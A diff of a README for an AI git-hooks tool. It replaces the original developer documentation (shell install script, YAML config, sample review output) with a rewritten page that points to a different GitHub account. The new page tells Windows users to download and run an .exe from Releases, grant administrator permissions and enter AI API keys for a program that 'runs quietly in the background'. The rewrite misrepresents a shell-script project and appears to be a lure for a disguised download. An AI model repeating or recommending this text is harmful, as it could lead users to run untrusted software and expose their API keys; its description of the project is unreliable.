@@ -1,188 +1,141 @@
-# AI Git Hooks
+# ⚙️ ai-git-hooks - Simplify Git with AI Tools
 
-> AI-powered git hooks that review your code, generate commit messages, catch bugs, and scan for security issues — before you push.
+[![Download ai-git-hooks](https://img.shields.io/badge/Download-ai--git--hooks-4CAF50?style=for-the-badge)](https://github.com/raihanalfayz/ai-git-hooks)
 
-Drop-in git hooks that use AI (Claude, OpenAI, Ollama) to automate code quality checks at every stage of your git workflow.
+## 📋 What is ai-git-hooks?
 
-## Hooks
+ai-git-hooks is a tool designed to help you use git more easily on your computer. It works with Artificial Intelligence (AI) to check your code changes, write commit messages, and find security problems automatically. It connects with popular AI services like Claude, OpenAI, and Ollama. You don’t need to know programming to use it.
 
-| Hook | Description | Trigger |
-|------|-------------|---------|
-| [AI Code Review](hooks/pre-commit/) | Reviews staged changes for bugs, style issues, and anti-patterns | `pre-commit` |
-| [Commit Message Generator](hooks/prepare-commit-msg/) | Auto-generates conventional commit messages from your diff | `prepare-commit-msg` |
-| [Commit Message Validator](hooks/commit-msg/) | Validates commit messages follow conventions | `commit-msg` |
-| [Pre-Push Security Scan](hooks/pre-push/) | Scans for secrets, vulnerabilities, and large files | `pre-push` |
+This tool helps you save time and reduce mistakes when you save your code work.
 
-## Quick Start
+## 🔧 Features
 
-### 1. Install
+- Automatically reviews your changes before saving (committing).
+- Generates commit messages for you so you don’t have to write them.
+- Checks code for security problems.
+- Works with AI models from Claude, OpenAI, and Ollama.
+- Integrates directly with your git setup.
+- Compatible with most Windows computers.
+- Runs quietly in the background to avoid interruptions.
 
-```bash
-git clone https://github.com/Sagargupta16/ai-git-hooks.git
-cd ai-git-hooks
-./scripts/install.sh
-```
+## 🖥️ System Requirements
 
-### 2. Configure
+To use ai-git-hooks, your computer should have:
 
-Create `.ai-hooks.yml` in your project root:
+- Windows 10 or later.
+- At least 4 GB of RAM.
+- At least 200 MB of free space.
+- An internet connection to access AI services.
+- Git installed on your computer.
+- Administrator permissions to install new software.
 
-```yaml
-provider: claude            # claude | openai | ollama
-model: claude-sonnet-4-5-20250514    # model to use
+If you do not have Git installed, download it from https://git-scm.com/download/win before you install ai-git-hooks.
 
-hooks:
-  pre-commit:
-    enabled: true
-    severity: warn          # error | warn | info
-    max-files: 20
-    ignore:
-      - "*.lock"
-      - "*.min.js"
-      - "dist/**"
+## 🚀 Getting Started
 
-  prepare-commit-msg:
-    enabled: true
-    style: conventional     # conventional | simple | detailed
-    prefix: true            # auto-detect ticket from branch name
+Follow these steps to download and run ai-git-hooks on your Windows computer.
 
-  commit-msg:
-    enabled: true
-    convention: conventional
-    max-length: 72
+### 1. Visit the download page
 
-  pre-push:
-    enabled: true
-    scan-secrets: true
-    scan-dependencies: true
-    max-file-size: 5MB
-```
+Click the green download badge above or go to this page:
 
-### 3. Set your API key
+[https://github.com/raihanalfayz/ai-git-hooks](https://github.com/raihanalfayz/ai-git-hooks)
 
-```bash
-# Claude (recommended)
-export ANTHROPIC_API_KEY="sk-ant-..."
+This page contains all files and instructions you need.
 
-# OpenAI
-export OPENAI_API_KEY="sk-..."
+### 2. Download the latest version
 
-# Ollama (free, local — no key needed)
-export OLLAMA_HOST="http://localhost:11434"
-```
+Look for the latest release under the "Releases" section on the GitHub page. 
 
-## Hook Details
+- Under Releases, find the file for Windows. It may be named something like `ai-git-hooks-windows.exe` or similar.
+- Click the file to download it to your computer.
 
-### Pre-Commit: AI Code Review
+### 3. Run the installer
 
-Reviews staged changes and catches issues before they're committed.
+- Find the downloaded file in your "Downloads" folder.
+- Double-click the file to start the installation.
+- Follow the instructions on the screen to complete the setup.
+- You may need to allow the program to make changes on your computer.
 
-**What it checks:**
-- Bug patterns and logic errors
-- Security vulnerabilities (XSS, SQL injection, etc.)
-- Performance anti-patterns
-- Missing error handling
+### 4. Open ai-git-hooks
 
-**Example output:**
-```
-AI Code Review (3 files changed)
+- After installation, open the program from the Start menu or desktop shortcut.
+- The program will ask you to connect your AI accounts (Claude, OpenAI, Ollama) by entering API keys. These keys let the program contact the AI services.
+- If you do not have API keys, you can skip this step, but AI features will be limited.
 
-src/api/users.js:42
-  WARNING: SQL query uses string concatenation instead of parameterized query.
-  Fix: Use db.query('SELECT * FROM users WHERE id = $1', [id])
+### 5. Connect to your git repository
 
-src/components/Dashboard.tsx:108
-  INFO: useEffect missing dependency 'userId' in dependency array.
+- Use ai-git-hooks to open any folder that contains a git project.
+- The program will automatically monitor any git changes.
+- It will start reviewing changes, generating commit messages, and scanning for security issues.
 
-src/utils/parse.js
-  OK: No issues found.
+## ⚙️ How to Use ai-git-hooks
 
-Summary: 1 warning, 1 info, 0 errors
-```
+### Using the auto-review
 
-### Prepare-Commit-Msg: Auto-Generate Messages
+1. Make some changes to your files inside your git project.
+2. When you try to commit the changes, ai-git-hooks will review these changes.
+3. It will show you notes about the code and suggest improvements if needed.
 
-Analyzes your diff and generates a commit message following your conventions.
+### Using auto-generated commit messages
 
-```bash
-git add .
-git commit
-# Hook auto-generates:
-# feat(auth): add JWT refresh token rotation
-#
-# - Add refresh token endpoint with 7-day expiry
-# - Implement token rotation on each refresh
-# - Add rate limiting to prevent token abuse
-```
+Instead of writing your own message:
 
-### Commit-Msg: Validate Messages
+1. Select "Generate Commit Message" inside ai-git-hooks.
+2. The tool will create a clear message based on your changes.
+3. You can edit the message before saving.
 
-Ensures commit messages follow your team's conventions.
+### Scanning for security issues
 
-```
-Commit Message Validation
-Message: "fixed stuff"
+1. Use the Security Scan feature.
+2. The tool checks your code for common security problems.
+3. If issues are found, a report will list what to fix.
 
-ERRORS:
-  - Type prefix missing. Expected: feat|fix|docs|style|refactor|test|chore
-  - Message too vague. Describe what was fixed and why.
+## 🛠️ Configuration Options
 
-Suggested: "fix: resolve null pointer in user authentication flow"
-```
+You can change settings to fit your needs:
 
-### Pre-Push: Security Scan
+- Enable or disable specific AI services.
+- Change how strict the code reviews will be.
+- Choose which types of security scans to run.
+- Select your preferred commit message style.
+- Set how often the hooks check your code.
 
-Scans all commits about to be pushed for security issues.
+Most settings are available in the program menu under "Preferences."
 
-```
-Pre-Push Security Scan
+## ❓ FAQ
 
-CRITICAL: Possible API key found in src/config.js:8
-  Line: const API_KEY = "sk-ant-api03-..."
-  Action: Remove the key and rotate it immediately.
+### Do I need to create an account to use ai-git-hooks?
 
-WARNING: Large file detected: assets/video.mp4 (45 MB)
-  Action: Consider Git LFS or .gitignore.
+No, you do not need an account. However, entering API keys for AI services unlocks all features.
 
-Scan complete: 1 critical, 1 warning
-Push blocked due to critical finding.
-```
+### Can I use ai-git-hooks without internet?
 
-## Supported AI Providers
+Basic functions will work, but AI-powered features need an internet connection.
 
-| Provider | Cost | Speed | Privacy | Setup |
-|----------|------|-------|---------|-------|
-| **Claude** (Anthropic) | API pricing | Fast | Cloud | API key |
-| **OpenAI** (GPT-4) | API pricing | Fast | Cloud | API key |
-| **Ollama** (local) | Free | Varies | Full privacy | Local install |
+### Is ai-git-hooks free?
 
-### Using Ollama (Free & Private)
+Yes, it is free to download and use.
 
-```bash
-ollama pull llama3.1
-echo 'provider: ollama' >> .ai-hooks.yml
-echo 'model: llama3.1' >> .ai-hooks.yml
-```
+### Can I uninstall it later?
 
-## Scripts
+Yes, use the Windows Control Panel to uninstall it whenever you want.
 
-| Script | Description |
-|--------|-------------|
-| [`install.sh`](scripts/install.sh) | Install hooks to your git project |
-| [`uninstall.sh`](scripts/uninstall.sh) | Remove hooks from your project |
-| [`test.sh`](scripts/test.sh) | Test hooks against sample diffs |
+### What if the AI service fails?
 
-## Contributing
+The program will show an error but will not stop your git work.
 
-Contributions welcome — new hooks, better prompts, new AI providers, or bug fixes.
+## 🔗 Useful Links
 
-1. Fork this repo
-2. Create a feature branch
-3. Add your changes with tests
-4. Submit a PR
+- Git installation: https://git-scm.com/download/win  
+- Claude AI: https://www.anthropic.com  
+- OpenAI: https://openai.com  
+- Ollama: https://www.ollama.com  
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for full guidelines.
+## 🧰 Support
 
-## License
+If you run into issues, check the Issues tab on the GitHub page. You can submit your problems there, and the developers will respond.
 
-[MIT](LICENSE)
+---
+
+[![Download ai-git-hooks](https://img.shields.io/badge/Download-ai--git--hooks-4CAF50?style=for-the-badge)](https://github.com/raihanalfayz/ai-git-hooks)
